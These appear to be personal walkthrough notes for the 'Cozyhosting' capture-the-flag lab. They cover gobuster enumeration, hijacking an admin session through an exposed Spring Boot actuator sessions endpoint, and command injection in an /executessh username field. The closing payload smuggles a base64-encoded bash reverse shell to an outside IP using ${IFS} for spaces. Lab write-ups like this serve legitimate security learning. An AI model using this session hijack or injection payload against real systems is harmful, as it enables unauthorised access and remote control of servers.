# Cozyhosting


## Spring boot
the 404 page reveals `# Whitelabel Error Page` which identifies the spring boot framework
## gobuster
Command
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -t 100 -u http://cozyhosting.htb -o cozy.gobuster
```
![[Pasted image 20231125073346.png]]

## subdomain
Nothing interesting

## gobuster
Running it again with wordlist tailored to spring boot since we identified it we find 
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt -t 100 -u http://cozyhosting.htb -o cozy.gobuster
```
![[Pasted image 20231125075005.png]]


Looking around we dont find anything interesting except the /sessions

# Spring boot actuator

## What is actuator
```
Actuator endpoints let you monitor and interact with your application. _Spring Boot_ includes a number of built-in endpoints and lets you add your own
```
## Sessions

upon visiting `/actuator/session`,
![[Pasted image 20231125081009.png]]
we get a username and JSESSIONID the unauthorized one is us

so by changing the JSESSIONID
![[Pasted image 20231125081104.png]]
we get logged in as admin

## Kanderson Admin
![[Pasted image 20231125081133.png]]


## executessh

We find theres a ssh connection settings
![[Pasted image 20231125084043.png]]
looking it in burp we find its /executessh


![[Pasted image 20231125084027.png]]
after fuzzing with username we find its running bash in command line
lets see what commands are available
for whitespace substituion we can do ${IFS}
we find `id whoami pwd` doesnt seem to work but `ping` works lets try our reverse shell


## Payload
We encode our payload in base64 pipe it over to bash jar
```bash
host=localhost&username=user;echo${IFS}L2Jpbi9iYXNoIC1jICcvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNDkvOTAwMSAwPiYxJwo=|base64${IFS}-d|bash;
```

[[00- Easy/Cozyhosting/Initial foothold|Initial foothold]]